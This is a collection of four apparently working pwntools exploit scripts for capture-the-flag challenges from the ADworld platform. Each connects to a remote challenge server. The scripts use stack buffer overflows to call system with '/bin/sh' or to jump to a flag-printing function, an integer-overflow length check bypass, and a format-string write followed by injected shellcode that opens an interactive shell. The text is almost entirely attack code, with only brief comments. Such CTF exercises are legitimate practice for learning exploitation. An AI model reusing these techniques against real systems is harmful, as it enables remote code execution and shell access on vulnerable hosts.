# ADworld

## cgpwn2

```python
from pwn import *
context.arch = 'i386'

# p = process('./pwn')
p = remote('111.198.29.45',35993)
elf = ELF('./pwn')
main = elf.sym['main']
system_plt = elf.sym['system']
binsh = 0x0804A080
p.sendlineafter("name\n",'/bin/sh\x00')
payload = 'A'*42 + p32(system_plt) + p32(main) + p32(binsh)
p.sendlineafter('here:\n',payload)
sleep(1)
p.interactive()
```

## forgot

```python
from pwn import *
context.arch='i386'

# p = process('./pwn')
p = remote('111.198.29.45',32374)

flag = 0x080486CC
p.sendline('A'*63 + p32(flag))
sleep(1)
print p.recv()
```

## int_overflow

```python
from pwn import *
context.arch = 'i386'

# p = process('./pwn')
p = remote('111.198.29.45',53636)

p.sendlineafter('Your choice:','1')
p.sendafter('username:','asd')

payload = 'A'*0x18 + p32(ELF('./pwn').sym['what_is_this'])
# make the eip point to function 'what_is_this' by stack overflow
p.sendafter("passwd:",payload.ljust(256+4,'B'))
# function check_password use the rigister al to store the length of passwd
# when we input the length of passwd is 256(0xff), 
# the rigister al could not store it, it will be zero(0)
# inorder to pass the judge(if ( v3 <= 3u || v3 > 8u )),
# we could intput the length of passwd is (256+3,256+8]
# then make stack overflow by fuction strcpy
p.recvuntil('Success\n')
print p.recv()
```

## string

```python
from pwn import *
context.arch = 'amd64'

# p = process('./pwn')
p = remote('111.198.29.45',53218)

print p.recvuntil('secret[0] is ')
a_0 = int(p.recvuntil('\n',drop=True),16)
log.info('a_0 = %#x',a_0)

p.sendlineafter("What should your character's name be:\n",'nop')
p.sendlineafter("So, where you will go?east or up?:","east")
p.sendlineafter("go into there(1), or leave(0)?:\n",'1')
p.sendlineafter("'Give me an address'\n",str(a_0))
p.sendlineafter("And, you wish is:\n",'%85c%7$n')
p.sendlineafter("Wizard: I will help you! USE YOU SPELL\n",asm(shellcraft.sh()))
sleep(1)
p.interactive()
```
